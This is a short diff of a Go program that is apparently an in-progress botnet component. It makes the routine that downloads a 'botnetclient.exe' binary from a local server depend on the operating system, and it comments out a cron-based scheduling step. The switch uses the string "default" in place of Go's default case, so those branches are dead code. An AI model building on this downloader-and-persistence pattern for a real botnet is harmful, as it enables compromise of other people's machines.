@@ -3,7 +3,7 @@ package main
 import (
 	"fmt"
 	"github.com/jung-kurt/gofpdf"
-	"github.com/robfig/cron/v3"
+	//"github.com/robfig/cron/v3"
 	"io"
 	"log"
 	"net/http"
@@ -61,7 +61,16 @@ func getclient() {
 	defer out.Close()
 
 	// Get the data
-	resp, err := http.Get("http://localhost:8081/client")
+	var resp *http.Response
+	switch opersys {
+	case "windows":
+		resp, err = http.Get("http://localhost:8081/client")
+	case "linux":
+		resp, err = http.Get("http://127.0.1.1:8081/client")
+	case "default":
+		fmt.Println("unsupported OS")
+		os.Exit(1)
+	}
 	if err != nil {
 		log.Fatalf("An Error Occured %v", err)
 	}
@@ -95,7 +104,7 @@ func main() {
 		// cron job probably isn't done here, but where?
 		clientName = filepath.Join(here, "\\botnetclient.exe")
 
-		cron := cron.New()
+		//cron := cron.New()
 	case "default":
 		fmt.Println("OS will not be supported")
 		os.Exit(1)
